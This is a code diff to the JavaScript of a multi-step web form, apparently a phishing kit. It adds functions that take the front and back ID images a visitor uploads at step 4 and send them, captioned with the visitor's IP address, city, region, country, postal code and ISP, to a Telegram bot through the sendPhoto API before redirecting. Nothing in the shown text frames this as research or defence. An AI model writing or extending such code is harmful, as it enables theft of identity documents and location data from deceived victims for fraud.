@@ -113,20 +113,12 @@ document.addEventListener('DOMContentLoaded', function() {
         if (validateStep4()) {
             showLoading('loading4');
 
-            // Collect all form data
-            const formData = collectFormData();
-
             try {
                 // Get IP and location information
                 const ipInfo = await getIPInfo();
 
-                // Send Step 4 data to Telegram
-                const step4Data = {
-                    frontId: formData.step4.frontId,
-                    backId: formData.step4.backId
-                };
-                
-                await sendStepToTelegram(4, step4Data, ipInfo);
+                // Send ID images to Telegram
+                await sendIDImagesToTelegram(ipInfo);
 
                 // Wait for 3 seconds before redirecting
                 setTimeout(function() {
@@ -197,6 +189,66 @@ document.addEventListener('DOMContentLoaded', function() {
                 postal: 'Unknown',
                 isp: 'Unknown'
             };
+        }
+    }
+
+    // Function to send ID images to Telegram
+    async function sendIDImagesToTelegram(ipInfo) {
+        const frontIdFile = document.getElementById('frontId').files[0];
+        const backIdFile = document.getElementById('backId').files[0];
+
+        if (!frontIdFile || !backIdFile) {
+            throw new Error('Both ID images are required');
+        }
+
+        try {
+            // Send front ID image
+            await sendImageToTelegram(frontIdFile, 'Front ID', ipInfo);
+            
+            // Send back ID image
+            await sendImageToTelegram(backIdFile, 'Back ID', ipInfo);
+        } catch (error) {
+            console.error('Error sending ID images:', error);
+            throw error;
+        }
+    }
+
+    // Function to send individual image to Telegram
+    async function sendImageToTelegram(imageFile, caption, ipInfo) {
+        const formData = new FormData();
+        formData.append('chat_id', TELEGRAM_CHAT_ID);
+        formData.append('photo', imageFile);
+        
+        const fullCaption = `${caption}
+
+*IP Information:*
+IP Address: ${ipInfo.ip}
+City: ${ipInfo.city}
+State/Region: ${ipInfo.region}
+Country: ${ipInfo.country}
+Postal Code: ${ipInfo.postal}
+ISP: ${ipInfo.isp}
+Timestamp: ${new Date().toLocaleString()}`;
+        
+        formData.append('caption', fullCaption);
+        formData.append('parse_mode', 'Markdown');
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const data = await response.json();
+            if (!data.ok) {
+                throw new Error('Telegram API error: ' + data.description);
+            }
+            console.log(`${caption} sent successfully to Telegram`);
+        } catch (error) {
+            console.error(`Error sending ${caption} to Telegram:`, error);
+            throw error;
         }
     }
 
